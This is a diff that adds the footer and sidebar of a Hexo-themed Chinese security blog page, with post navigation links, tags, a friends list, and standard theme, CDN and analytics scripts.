+                            <a href="/2018/09/vulnhub-练习记录/" data-toggle="tooltip" data-placement="top" title="vulnhub 练习记录">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/08/xss知识点小记/" data-toggle="tooltip" data-placement="top" title="xss知识点小记">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#weblogic" title="weblogic">weblogic</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
